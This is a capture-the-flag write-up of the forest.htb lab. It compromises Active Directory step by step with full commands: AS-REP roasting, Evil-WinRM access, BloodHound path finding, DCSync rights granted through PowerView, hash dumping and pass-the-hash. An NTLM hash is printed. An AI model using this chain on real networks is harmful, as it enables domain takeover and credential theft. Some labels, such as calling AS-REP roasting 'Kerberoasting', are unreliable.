````markdown
# Forest CTF Room Writeup

**Target**: forest.htb  
**Goal**: Initial access via Kerberoasting, privilege escalation through ACL abuse and BloodHound path analysis, final compromise by dumping Domain Admin hash.

---

## 1. Initial Enumeration

Started with SMB enumeration using `enum4linux`:

```bash
enum4linux -a 10.10.10.161
````

Found valid usernames:

```
Administrator
Guest
krbtgt
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

---

## 2. Kerberoasting → Credential Extraction

Queried for SPNs to identify accounts with service tickets using:

```bash
impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -request
```

This returned an AS-REP encrypted hash for `svc-alfresco`.

Cracked it with Hashcat:

```bash
hashcat -m 18200 hash.txt rockyou.txt --force
```

✅ Recovered password for `svc-alfresco`: `s3rvice`

---

## 3. Gained Initial Foothold

Logged in using Evil-WinRM with the cracked credentials:

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

📥 Retrieved `user.txt`.

---

## 4. BloodHound Enumeration

Used `bloodhound-python` to gather Active Directory data:

```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c All --zip
```

Imported results into BloodHound.

📊 Discovered the following privilege path:

```
svc-alfresco
   ↓ (Member of)
Account Operators
   ↓ (GenericAll)
Exchange Admins
   ↓ (WriteDACL)
Domain Object (DC=htb,DC=local)
```

🔓 Meaning: if we control `Exchange Admins`, we can give **anyone** DCSync rights and dump hashes.

---

## 5. Exploitation via ACL Abuse

### 5.1 Created a new domain user:

```powershell
net user myuser mypass /add /domain
```

### 5.2 Added `myuser` to `Exchange Admins` group:

```powershell
net group "Exchange Admins" myuser /add /domain
```

### 5.3 Logged in as `myuser`:

```bash
evil-winrm -i 10.10.10.161 -u myuser -p mypass
```

---

## 6. Abuse WriteDACL → Grant DCSync Rights

Uploaded and imported PowerView:

```powershell
upload /path/to/PowerView.ps1
. .\PowerView.ps1
```

Built a credential object:

```powershell
$SecPassword = ConvertTo-SecureString 'mypass' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\myuser', $SecPassword)
```

Granted DCSync rights to `myuser`:

```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity "myuser" -Rights DCSync
```

---

## 7. Dumped Domain Hashes

Using Impacket:

```bash
impacket-secretsdump htb.local/myuser:mypass@10.10.10.161
```

✅ Dumped hash for `Administrator`:

```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

---

## 8. Domain Admin Access (Pass-the-Hash)

Used the Administrator NTLM hash to gain shell:

```bash
impacket-wmiexec htb.local/Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

🎉 **Gained full Domain Admin access**

---

## 9. Final Result

🪣 Dumped all domain user hashes
🧠 Took control of the entire Active Directory domain
🏁 Retrieved `root.txt` as Domain Administrator

---

## 🏁 Summary

| Step | Technique                                       |
| ---- | ----------------------------------------------- |
| 1    | Enumerated usernames via SMB                    |
| 2    | Performed AS-REP roasting to crack svc-alfresco |
| 3    | Gained user shell via Evil-WinRM                |
| 4    | Used BloodHound to discover ACL privilege path  |
| 5    | Created user and added to Exchange Admins       |
| 6    | Abused WriteDACL to assign DCSync rights        |
| 7    | Dumped Administrator hash                       |
| 8    | Logged in as Domain Admin (Pass-the-Hash)       |

**A perfect example of a no-exploit, misconfiguration-based full domain compromise.**

```
```
